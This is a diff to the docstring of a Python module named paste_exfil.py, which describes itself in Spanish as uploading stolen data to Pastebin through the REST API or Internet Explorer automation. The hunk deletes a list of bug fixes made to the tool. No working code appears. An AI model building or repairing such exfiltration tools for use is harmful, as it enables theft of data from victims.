@@ -4,20 +4,7 @@ paste_exfil.py - Exfiltración a Pastebin (API directa e Internet Explorer)
 Proporciona dos métodos para subir datos robados a Pastebin:
   - plain_paste(): usa la API REST de Pastebin directamente con `requests`.
   - ie_paste():    automatiza Internet Explorer mediante win32com (Windows).
-
-ERRORES CORREGIDOS:
-    1. Credenciales personales `ch4rl13` / `hxck@123` eliminadas;
-       reemplazadas por variables de entorno.
-    2. Las funciones auxiliares (wait_for_browser, random_sleep, login,
-       submit, ie_paste) estaban definidas DENTRO del cuerpo de plain_paste()
-       como funciones locales, lo que las hacía inaccesibles desde fuera
-       y causaba errores de indentación. Movidas al nivel de módulo.
-    3. `elem.setAttibute(...)` → typo; corregido a `elem.setAttribute(...)`.
-    4. `client.Dispatch('InternetExplorer.Aplication')` → typo;
-       corregido a `'InternetExplorer.Application'`.
-    5. El bloque `if __name__ == '__main__':` estaba indentado dentro de
-       plain_paste(), haciéndolo inalcanzable. Movido al nivel de módulo.
-
+  
 REQUISITOS:
     pip install requests pywin32   # pywin32 solo para ie_paste()
 
